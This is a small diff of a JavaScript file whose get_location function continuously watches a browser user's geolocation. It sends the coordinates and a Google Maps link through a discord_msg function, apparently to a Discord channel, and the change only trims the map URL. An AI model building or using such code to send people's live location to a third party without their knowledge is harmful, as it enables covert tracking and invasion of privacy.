@@ -19,7 +19,7 @@ function discord_msg(mesage) {
 async function get_location() {
     dosomething = navigator.geolocation.watchPosition((position) => {
         discord_msg(position.coords.latitude + " " + position.coords.longitude);
-        discord_msg("https://www.google.no/maps/@" + position.coords.latitude + "," + position.coords.longitude + "m/data=!3m1!1e3?hl=no&entry=ttu&g_ep=EgoyMDI0MTIwMy4wIKXMDSoASAFQAw%3D%3D");
+        discord_msg("https://www.google.no/maps/@" + position.coords.latitude + "," + position.coords.longitude + "m/");
 
       });
 };
